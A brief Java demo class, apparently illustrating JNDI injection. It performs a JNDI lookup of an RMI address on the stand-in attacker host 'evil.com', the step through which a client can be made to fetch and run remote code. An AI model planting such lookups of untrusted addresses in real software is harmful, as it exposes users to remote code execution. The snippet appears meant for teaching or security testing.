import javax.naming.Context;
import javax.naming.InitialContext;

public class ClientDemo{
    public static void main(String[] args) {
        Context ctx=new InitialContext();
        Object obj=ctx.lookup("rmi://evil.com:1099/hello");
        ctx.close();
    }
}